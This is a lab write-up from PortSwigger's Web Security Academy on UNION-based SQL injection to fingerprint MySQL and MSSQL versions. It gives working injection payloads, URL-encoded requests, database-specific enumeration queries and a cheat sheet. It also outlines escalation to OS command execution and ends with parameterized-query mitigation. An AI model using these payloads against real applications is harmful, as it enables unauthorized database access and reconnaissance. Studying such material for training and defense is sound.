# SQL Injection UNION Attack - Querying Database Type and Version (MySQL/Microsoft)

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Practitioner  
**Date:** March 2026

---

## Objective

Determine the database type and extract the database version information using a UNION-based SQL injection attack on MySQL or Microsoft SQL Server.

---

## Vulnerability

The application is vulnerable to UNION-based SQL injection in the product category filter. Unlike Oracle (Lab 6), MySQL and Microsoft SQL Server use **global system variables** to store version information rather than system tables.

**Backend Query Structure:**
```sql
SELECT product_name, product_description FROM products WHERE category = 'USER_INPUT'
```

**Developer Mistake:**  
- **No input sanitization** allowing SQL injection
- **Access to system variables** — the database user can query `@@version`
- **Version information exposed** to anyone who can inject SQL
- **No output filtering** — version strings are displayed directly on the page

---

## Understanding MySQL/MSSQL Version Queries

### Key Differences from Oracle:

| Concept | Oracle | MySQL/MSSQL |
|---------|--------|-------------|
| **Version storage** | Table: `v$version` | Global variable: `@@version` |
| **Query syntax** | `SELECT banner FROM v$version` | `SELECT @@version` |
| **FROM clause** | Required (can use `dual`) | Not required |
| **Comment syntax** | `--` (space optional) | MySQL: `-- ` (space required) or `#`<br>MSSQL: `--` (space optional) |

### Global System Variables:

MySQL and MSSQL use `@@variable_name` syntax for system-wide settings:
- **`@@version`** — Database version string
- **`@@datadir`** — Data directory path (MySQL)
- **`@@hostname`** — Server hostname
- **`user()`** — Current database user (MySQL)
- **`database()`** — Current database name (MySQL)

---

## Steps

1. **Detected MySQL or MSSQL database**
   - Standard UNION payloads work without `FROM dual`
   - No Oracle-specific syntax errors

2. **Found column count**
   - Payload: `' UNION SELECT NULL,NULL--`
   - Result: ✅ Success → 2 columns confirmed

3. **Tested for text columns**
   - Payload: `' UNION SELECT 'test',NULL--`
   - Result: ✅ Column 1 accepts text

4. **Queried version using global variable**
   - Used `@@version` instead of a table query
   - Payload: `' UNION SELECT @@version,NULL--`

5. **Handled comment syntax correctly**
   - Used `--+` (URL-encoded space after dashes)
   - Ensures MySQL recognizes the comment

6. **Extracted version information**
   - Version string displayed on the page
   - Lab solved ✅

---

## Payload

```sql
' UNION SELECT @@version,NULL--
```

**URL-Encoded Version:**
```
category=Gifts%27UNION+SELECT+@@version,NULL--+
```

**Breaking Down the URL Encoding:**
- `%27` = `'` (single quote)
- `+` = space character
- `--+` = `-- ` (two dashes + space for MySQL comment)

**Complete URL:**
```
/filter?category=Gifts' UNION SELECT @@version,NULL--
```

**Resulting SQL Query:**
```sql
SELECT product_name, product_description FROM products WHERE category = 'Gifts'
UNION
SELECT @@version, NULL-- '
```

**What happens:**
- `Gifts'` closes the category string
- `UNION SELECT @@version,NULL` injects version query
- `@@version` is a global variable — no table needed
- MySQL/MSSQL returns version string like:
  - MySQL: `8.0.30-0ubuntu0.20.04.2`
  - MSSQL: `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5`
- `-- ` (with space) comments out trailing SQL

---

## The Comment Syntax Trick

### Why `--+` in the URL?

MySQL has a **strict requirement** for comment syntax:

```sql
-- ❌ MySQL doesn't recognize this as a comment
' UNION SELECT @@version,NULL--

-- ✅ MySQL requires a space after --
' UNION SELECT @@version,NULL-- 
```

**In URLs:**
- Literal space gets URL-encoded as `%20` or replaced with `+`
- `--+` = `-- ` (dash dash space)
- This ensures MySQL recognizes the comment

**Database Comment Requirements:**

| Database | Comment Syntax | Space Required? |
|----------|---------------|-----------------|
| MySQL | `-- ` or `#` | ✅ Yes for `--` |
| MSSQL | `--` | ❌ No |
| Oracle | `--` | ❌ No |
| PostgreSQL | `--` | ❌ No |

---

## MySQL vs MSSQL Version Fingerprinting

### Distinguishing Between Them:

**MySQL-Specific Queries:**
```sql
' UNION SELECT @@version_comment,NULL--
' UNION SELECT database(),NULL--
' UNION SELECT user(),NULL--
```

**MSSQL-Specific Queries:**
```sql
' UNION SELECT @@SERVERNAME,NULL--
' UNION SELECT DB_NAME(),NULL--
' UNION SELECT SYSTEM_USER,NULL--
```

**Common to Both:**
```sql
' UNION SELECT @@version,NULL--
```

---

## What I Learned

1. **MySQL/MSSQL use global variables (`@@`) not tables** for version info
2. **Comment syntax matters** — MySQL requires space after `--`
3. **URL encoding trick** — `--+` ensures proper comment syntax
4. **No FROM clause needed** for global variables (unlike Oracle)
---

## Database-Specific Enumeration

### MySQL Version Information:
```sql
' UNION SELECT @@version,NULL--           # Version string
' UNION SELECT @@version_comment,NULL--   # Compile info
' UNION SELECT @@datadir,NULL--           # Data directory
' UNION SELECT database(),NULL--          # Current database
' UNION SELECT user(),NULL--              # Current user
```
---

## Real-World Pentesting Value

**Why this matters:**

1. **Identify exact database type** — MySQL vs MSSQL vs PostgreSQL
2. **Version-specific exploits** — CVE databases for unpatched versions
3. **Syntax adaptation** — use correct functions for further exploitation
4. **Configuration details** — data paths, users, server names
5. **Infrastructure mapping** — understand the technology stack

**Example Attack Path:**
```
1. Extract version: MySQL 5.5.62 (this lab)
   ↓
2. Research: MySQL 5.5.x has privilege escalation bugs
   ↓
3. Exploit: Use UDF (User Defined Function) injection
   ↓
4. Result: Gain OS command execution via database
```

---

## Mitigation

**For Developers:**
- Use **parameterized queries** — prevents all SQL injection
- **Restrict access to system variables** — application user shouldn't need them
- Apply **least privilege** — limit database permissions
- **Disable error messages** in production — prevents information leakage.
**Example Fix (Python with MySQL):**
```python
# ❌ Vulnerable
query = f"SELECT * FROM products WHERE category = '{user_input}'"

# ✅ Secure
query = "SELECT * FROM products WHERE category = %s"
cursor.execute(query, (user_input,))
```

---

## Database Version Query Cheat Sheet

### Quick Reference:

**Oracle:**
```sql
' UNION SELECT banner,NULL FROM v$version--
```

**MySQL:**
```sql
' UNION SELECT @@version,NULL-- 
# or
' UNION SELECT @@version,NULL#
```

**Microsoft SQL Server:**
```sql
' UNION SELECT @@version,NULL--
```

**PostgreSQL:**
```sql
' UNION SELECT version(),NULL--
```